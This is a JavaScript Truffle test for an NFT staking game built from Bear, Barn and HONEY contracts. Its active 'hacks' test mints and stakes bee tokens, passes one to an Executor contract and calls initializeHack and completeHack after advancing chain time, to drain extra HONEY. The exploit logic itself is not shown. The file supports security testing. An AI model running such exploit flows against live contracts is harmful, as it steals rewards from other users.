const TimeTravel = require("./util/TimeTravel");

const HONEY = artifacts.require("HONEY");
const Forest = artifacts.require("Barn");
const Bear = artifacts.require("Bear");
const Executor = artifacts.require("Executor");

const timeAdvanceMillis = 49 * 3600 * 1000;

contract("ERC721Enumerable", function (accounts) {
  // it("normal case", async () => {
  //   const beear = await Bear.deployed();
  //   const forest = await Forest.deployed();
  //   const honey = await HONEY.deployed();
  //
  //   await beear.mint(10, false, {
  //     from: accounts[1],
  //     value: (BigInt(web3.utils.toWei("0.069420", "ether")) * 10n).toString(),
  //   });
  //
  //   let tokenId;
  //   for (tokenId = 1; tokenId < 10; tokenId++) {
  //     if ((await beear.getTokenTraits(tokenId)).isBee) break;
  //   }
  //
  //   await forest.addManyToForestAndPack(accounts[1], [tokenId], {
  //     from: accounts[1],
  //   });
  //
  //   await TimeTravel.advanceTimeAndBlockTo(
  //     Math.floor((Date.now() + timeAdvanceMillis) / 1000)
  //   );
  //
  //   await forest.claimManyFromForestAndPack([tokenId], true, { from: accounts[1] });
  //
  //   console.log(
  //     "Balance after withdraw",
  //     (await honey.balanceOf(accounts[1])).toString()
  //   );
  //
  //   // const forest = await Barn.deployed();
  //   //  forest.addManyToForestAndPack(accounts[1], [1], {from: accounts[1]})
  // });

  it("hacks", async function () {
    const beear = await Bear.deployed();
    const forest = await Forest.deployed();
    const honey = await HONEY.deployed();
    const executor = await Executor.deployed();

    for (let i = 0; i < 3; i++) {
      await beear.mint(10, false, {
        from: accounts[1],
        value: (BigInt(web3.utils.toWei("0.069420", "ether")) * 10n).toString(),
      });
    }

    const beeIds = [];
    for (let tokenId = 1; tokenId < 30; tokenId++) {
      if ((await beear.getTokenTraits(tokenId)).isBee) beeIds.push(tokenId);
    }

    if (beeIds.length < 5)
      throw new Error("Too few bees. Run test again.");

    console.log("Normal bee stake count", beeIds.length - 1);
    for (const beeId of beeIds.slice(1)) {
      await forest.addManyToForestAndPack(accounts[1], [beeId], {
        from: accounts[1],
      });
    }

    const tokenId = beeIds[0];


    await beear.transferFrom(accounts[1], executor.address, tokenId, {
      from: accounts[1],
    });

    await executor.initializeHack(tokenId);

    await TimeTravel.advanceTimeAndBlockTo(
      Math.floor((Date.now() + timeAdvanceMillis) / 1000)
    );


    await executor.completeHack({gas: 30000000});

    console.log(
      "Balance after withdraw",
      (await honey.balanceOf(executor.address)).toString()
    );
  });
});
